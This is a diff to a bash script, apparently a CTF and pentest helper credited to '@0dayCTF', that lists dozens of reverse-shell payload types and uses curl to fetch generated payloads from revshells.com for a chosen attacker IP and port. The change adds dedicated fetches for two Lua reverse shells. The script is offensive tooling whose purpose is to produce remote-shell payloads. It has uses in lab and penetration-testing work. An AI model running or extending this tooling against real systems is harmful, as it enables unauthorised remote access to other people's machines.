@@ -5,8 +5,8 @@ echo "Twitter: @0dayCTF, @VainXploits & @elbee_ez"
 
 #Types of Payloads
 
-#echo "--------------------------------------"
-#echo "IMPORTANT NOTE: This program is case sensitive, please enter the exact text you see, in the available payloads section within the PAYLOAD field! please add a '%20' if there are spaces between words in the payload. Example (PAYLOAD: Bash&20-i)"
+echo "--------------------------------------"
+echo "IMPORTANT NOTE: This program is case sensitive, please enter the exact text you see, in the available payloads section within the PAYLOAD field! please add a '%20' if there are spaces between words in the payload. Example (PAYLOAD: Bash&20-i)"
 
 #Payloads Available
 echo "--------------------------------------"
@@ -117,9 +117,9 @@ telnet="51: telnet"
 echo $telnet
 zsh="52: zsh"
 echo $zsh
-lua1="53: Lua #1"
+lua1="53: Lua 1"
 echo $lua1
-lua2="54: Lua #2"
+lua2="54: Lua 2"
 echo $lua2
 golang="55: Golang"
 echo $golang
@@ -193,4 +193,12 @@ then
     curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n > $FILENAME
 else
     curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n
+fi
+
+if [[ $PAYLOAD == "Lua 1" ]]
+then
+    curl "https://www.revshells.com/Lua%20%231?ip=$IP&port=$PORT&shell=sh&encoding=sh"
+elif [[ $PAYLOAD == "Lua 2" ]]
+then
+    curl "https://www.revshells.com/Lua%20%232?ip=$IP&port=$PORT&shell=sh&encoding=sh"
 fi
